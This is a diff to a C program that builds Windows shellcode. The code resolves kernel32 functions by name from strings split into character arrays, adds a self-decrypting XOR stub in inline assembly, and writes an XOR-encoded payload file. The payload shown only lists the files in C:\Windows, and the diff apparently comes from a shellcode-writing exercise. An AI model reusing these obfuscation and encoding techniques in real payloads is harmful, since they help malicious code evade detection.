@@ -281,52 +281,48 @@ typedef DWORD near* PDWORD;
 typedef _W64 unsigned long ULONG_PTR, * PULONG_PTR;
 typedef ULONG_PTR SIZE_T, * PSIZE_T;
 
-void shellcode() {
+void __stdcall shellcode();
+
+void temp() {
 	__asm {
 		push eax
 		push edx
 		push ebx
 
 		xor edx, edx
-		add edx, 96
+		add edx, 120
+		add edx, 120
+		add edx, 120
+		add edx, 120
+		add edx, 116
 		mov eax, esp
-		add eax, 43
+		add eax, 64
 		Hassmen:
-			mov ebx, [esp + eax]
+			mov ebx, [eax]
 			xor ebx, 0xEEEEEEEE
-			mov[esp + eax], ebx
+			mov [eax], ebx
 			add eax, 4
 			sub edx, 4
 			jnz Hassmen
 
-		pop ebx
-		pop edx
-		pop eax
+			pop ebx
+			pop edx
+			pop eax
 	}
-	/*xor edx, edx
-		add edx, 96
-		mov eax, esp
-		add eax, 43
-		ttt:
-	mov ebx, [eax]
-		xor ebx, 0xeeeeeeee
-		mov[eax], ebx
-		add eax, 4
-		sub edx, 4
-		jnz ttt*/
+	shellcode();
+}
 
+void __stdcall shellcode() {
 	unsigned short baseString[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'};
 	LPVOID base = getModule((const LPWSTR)baseString);
 
-	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
-	WIN32_FIND_DATAA FindFileData;
-
 	const char func1String[] = { 'F', 'i', 'n', 'd', 'F','i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
-	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
-	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
-
 	LPVOID func1 = get_func_by_name((HMODULE)base, (LPSTR)func1String);
+
+	const char func2String[] = { 'F', 'i', 'n', 'd', 'N','e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0' };
 	LPVOID func2 = get_func_by_name((HMODULE)base, (LPSTR)func2String);
+
+	const char func3String[] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0' };
 	LPVOID func3 = get_func_by_name((HMODULE)base, (LPSTR)func3String);
 
 	HMODULE(WINAPI * f_FindFirstFileA)
@@ -337,7 +333,9 @@ void shellcode() {
 
 	HMODULE(WINAPI * f_FindClose)
 		(HANDLE hFindFile) = (HMODULE(WINAPI*)(HANDLE))func3;
-
+	
+	WIN32_FIND_DATAA FindFileData;
+	const char startDir[] = { 'C',':','\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '*', '\0' };
 	void* hf = f_FindFirstFileA(startDir, &FindFileData);
 	if (hf == INVALID_HANDLE_VALUE) return;
 
@@ -346,10 +344,11 @@ void shellcode() {
 	FILE* file = fopen(fileString, mode);
 
 	int i = 0;
+	char ch = '\n';
 	do {
 		if (i > 1) {
 			fputs(FindFileData.cFileName, file);
-			fputc('\n', file);
+			fputc(ch, file);
 		}
 		i++;
 	} while (f_FindNextFileA(hf, &FindFileData));
@@ -362,18 +361,19 @@ void shellcodeEND() {}
 int main() {
 	//shellcode();
 	FILE* out = fopen("shell.bin", "w");
-	fwrite(shellcode, (int)shellcodeEND - (int)shellcode, 1, out);
+	fwrite(temp, (int)shellcodeEND - (int)temp, 1, out);
 	fclose(out);
 
 	char myXor = 0xEE;
-	int mySize = 591;
+	int mySize = 641;
+	int offset = 48;
 
 	FILE* bin = fopen("shell.bin", "rb");
 	FILE* xorBin = fopen("shell_xor.bin", "wb");
-	unsigned char buf[591];
+	unsigned char buf[642];
 
 	fread(buf, sizeof(char), mySize, bin);
-	for (int i = 0; i < mySize; i++)
+	for (int i = offset; i < mySize; i++)
 		buf[i] ^= myXor;
 
 	fwrite(buf, sizeof(char), mySize, xorBin);
